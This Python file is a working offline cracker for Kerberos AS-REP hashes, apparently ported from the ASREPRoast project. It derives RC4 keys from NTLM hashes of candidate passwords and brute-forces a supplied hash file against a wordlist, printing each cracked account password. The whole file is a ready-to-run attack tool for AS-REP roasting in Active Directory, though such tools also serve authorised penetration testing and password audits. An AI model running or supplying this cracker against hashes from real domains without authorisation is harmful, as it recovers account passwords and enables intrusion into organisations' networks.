# Reference:
# https://github.com/HarmJ0y/ASREPRoast/blob/1c94ef12038df1378f5e663fe3b8137e46c60896/tgscrack.go

import hashlib
import hmac
import sys
from Crypto.Cipher import ARC4
import argparse

# https://gist.github.com/gthomas/3452673


def hmac_md5(key: bytes, data: bytes):
    return hmac.new(key, data, 'MD5').digest()

# https://stackoverflow.com/questions/15603628/how-to-calculate-ntlm-hash-in-python


def get_ntlm_hash(password: str):
    # UTF16 Little Endian, used by Microsoft for Wide Strings
    password_bytes = password.encode('utf-16le')

    # use the MD4 hashing algorithm on the password
    hash_object = hashlib.new('md4', password_bytes)

    # return the bytes of the digest (as needed by def hmac_md5)
    return hash_object.digest()


def rc4_decrypt(k3: bytes, encrypted_data: bytes):
    rc4_cipher = ARC4.new(k3)
    return rc4_cipher.decrypt(encrypted_data)


"""
Steps:
1. Calculate the NTLM hash of your password
2. Calculate k1 = HMAC-MD5(key: NTLM_hash, data: bytes([8, 0, 0, 0]))
3. Calculate k3 = HMAC-MD5(key: asrep_hash.checksum, data: k1)
4. Decrypt asrep_hash.encrypted_data using the RC4 algorithm, with k3 as the key
5. Compare the checksum of the decrypted bytes with asrep_hash.checksum
"""


def check_asrep_hash(asrep_hash, password):
    checksum, encrypted_data = asrep_hash.split(':')[1].split('$')
    # print(f"[#] Checksum: {checksum}")
    # print(f"[#] Encrypted data: {encrypted_data}")

    checksum_bytes = bytes.fromhex(checksum)
    encrypted_data_bytes = bytes.fromhex(encrypted_data)

    ntlm_hash = get_ntlm_hash(password)
    # print(f"[#] NTLM hash: {ntlm_hash.hex()}")

    k1 = hmac_md5(ntlm_hash, bytes([8, 0, 0, 0]))
    k3 = hmac_md5(k1, checksum_bytes)

    decrypted_bytes = rc4_decrypt(k3, encrypted_data_bytes)

    if hmac_md5(k1, decrypted_bytes) == checksum_bytes:
        # print(f"[#] Found password: {password}")
        return True

    return False


def crack_asrep_hashes(hashes: list, passwords: list):
    for asrep_hash in hashes:
        for password in passwords:
            if check_asrep_hash(asrep_hash, password):
                print(f"[+] {asrep_hash}:{password}")
                break


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-f', '--file', help='File containing AS-REP hashes', required=True)
    parser.add_argument(
        '-w', '--wordlist', help='Wordlist used for the bruteforcing', required=True)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    hash_file = args.file
    wordlist_file = args.wordlist

    asrep_hashes = [x.strip() for x in open(hash_file).readlines()]
    passwords = [x.strip() for x in open(wordlist_file).readlines()]

    crack_asrep_hashes(asrep_hashes, passwords)


if __name__ == "__main__":
    main()
